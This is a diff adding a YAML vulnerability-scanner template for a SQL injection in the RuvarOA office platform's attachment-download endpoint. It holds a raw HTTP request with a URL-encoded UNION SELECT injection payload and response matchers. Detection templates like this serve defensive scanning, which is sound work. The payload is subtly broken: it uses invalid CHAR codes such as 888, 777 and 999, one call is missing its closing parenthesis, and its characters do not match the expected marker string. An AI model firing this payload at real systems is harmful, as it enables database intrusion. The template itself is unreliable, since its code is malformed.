@@ -1,0 +1,29 @@
+id: ruvaroa-sqli-vulnerability
+
+info:
+  name: RuvarOA SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The RuvarOA collaborative office platform is vulnerable to SQL Injection via the `sys_file_storage_id` parameter in the `department_plan_attach_download.aspx` endpoint.
+  tags: sqli, vulnerability
+
+http:
+  - raw:
+      - |
+        GET /DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2bCHAR%28106%29%2bCHAR%28118%29%2bCHAR%2898%29%2bCHAR%28113%29%2bCHAR%2873%29%2bCHAR%28107%29%2bCHAR%2866%29%2bCHAR%2881%29%2bCHAR%2871%29%2bCHAR%2889%29%2bCHAR%28114%29%2bCHAR%28888%29%2bCHAR%2876%29%2bCHAR%2866%29%2bCHAR%2890%29%2bCHAR%2886%29%2bCHAR%2874%29%2bCHAR%28109%29%2bCHAR%2898%29%2bCHAR%28106%29%2bCHAR%28107%29%2bCHAR%2885%29%2bCHAR%2871%29%2bCHAR%28777%29%2bCHAR%2885%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28101%29%2bCHAR%28120%29%2bCHAR%2874%2bCHAR%28117%29%2bCHAR%2876%29%2bCHAR%28102%29%2bCHAR%28120%29%2bCHAR%28887%29%2bCHAR%28105%29%2bCHAR%28888%29%2bCHAR%28105%29%2bCHAR%28884%29%2bCHAR%28888%29%2bCHAR%28883%29%2bCHAR%28105%29%2bCHAR%28774%29%2bCHAR%28888%29%2bCHAR%28777%29%2bCHAR%28999%29%2bCHAR%28775%29%2bCHAR%28777%29%2bCHAR%28888%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL--%20- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qjvbqIkBQGYrXGLBZVJmbjkUGMcUgveXJuARiLfxWeiTqvvqv"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
